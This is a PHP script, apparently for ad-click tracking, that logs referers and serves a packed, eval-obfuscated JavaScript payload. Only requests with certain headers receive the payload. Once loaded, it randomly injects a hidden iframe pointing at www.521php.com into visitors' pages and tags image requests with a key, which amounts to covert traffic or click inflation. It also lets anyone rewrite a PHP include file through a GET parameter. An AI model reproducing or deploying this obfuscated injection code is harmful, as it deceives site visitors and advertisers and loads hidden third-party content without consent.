<?php
define('JP_LOG_OPEN',true);
define('JP_LOG_DIR','/data/log/adclick/');
//获取客户端IP
function getRemoteIp()
{
	return isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])?$_SERVER['HTTP_X_CLUSTER_CLIENT_IP']:$_SERVER['REMOTE_ADDR'];
}
if (!function_exists('getallheaders'))  
{ 
    function getallheaders()   
    {  
       foreach ($_SERVER as $name => $value)   
       {  
           if (substr($name, 0, 5) == 'HTTP_')   
           {  
               $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;  
           }  
       }
       return $headers;  
    }
}
function write_log($type="",$content="",$d=''){
	if(!JP_LOG_OPEN) return FALSE;
    $time = time();
    $date = date('Y-m-d H:i:s',$time);
    $logdir = 'fav_'.date("Ymd",$time);
    if($d){
        $dir = $d.date('Y-m',$time);
    }else{
        $dir=JP_LOG_DIR.date('Y-m',$time);
    }
    if(!is_dir($dir)){
        if(!mkdir($dir)){
            return false;
        }
    }
    $filename=$dir.DIRECTORY_SEPARATOR.$logdir.'.log';
    $message ='';
    if ( ! $fp = @fopen($filename, 'ab'))
    {
        return FALSE;
    }
    $message .= '['.$date.']-['.getRemoteIp().']-['.$type."] --> $content\n";
    flock($fp, LOCK_EX|LOCK_NB);
    fwrite($fp, $message);
    flock($fp, LOCK_UN);
    fclose($fp);
    return true;
}
//生成key
if(1==@$_GET['upkey']){
	$k = uniqid();
	$c = '<?php $key=\''.$k.'\';';
	file_put_contents('inc.php',$c);
}else{
	$u = $_SERVER['HTTP_REFERER'];
	if($u){
		//$g_url =  $_SERVER['HTTP_HOST'];
		$h = getallheaders();
		if('*/*'==$h['Accept']){
		write_log('HTTP_REFERER',$u);
		include('inc.php');
		echo 'var _favkey="'.$key.'";';
?>

var _fav = 6;
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[02-9a-hjl-n]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 4(5,7){0 8=7-5;0 9=a.random();return(5+a.round(9*8))}0 b=4(1,10);if(_fav>=b){0 c=4(1,100);0 d=\'<e style="display:none"><f 3="g://h.j.l/index_\'+c+\'.html"></f></e>\';document.write(d)}$(2(){$("img[3*=\'g://h.j.l/api/fav/\']").each(2(i){0 6=$(this);0 m=6.n("3");setTimeout(2(){6.n("3",m+"&k="+_favkey)},i*500)})});',[],24,'var||function|src|GetRandomNum|Min|_this|Max|Range|Rand|Math|_num2|_n|_html|div|iframe|http|www||521php||com|_src|attr'.split('|'),0,{}))
<?php
		}
	}else{
		echo 'don\'t do bad thing';
	}
}
